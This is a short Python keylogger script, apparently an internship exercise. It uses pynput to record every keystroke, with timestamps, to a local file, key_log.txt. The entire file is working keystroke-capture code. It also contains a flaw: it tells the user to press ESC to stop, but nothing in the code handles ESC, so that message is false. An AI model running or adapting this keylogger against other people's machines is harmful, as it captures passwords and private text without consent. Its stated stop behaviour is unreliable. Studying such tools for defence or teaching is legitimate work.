from pynput import keyboard
import datetime

# File to store logs
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} - Key pressed: {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} - Special key: {key}\n")

def main():
    print("🛡 Simple Keylogger Started (ProDigy Infotech)")
    print("📝 Logging to 'key_log.txt'...\nPress ESC to stop.")

    # Start listening
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
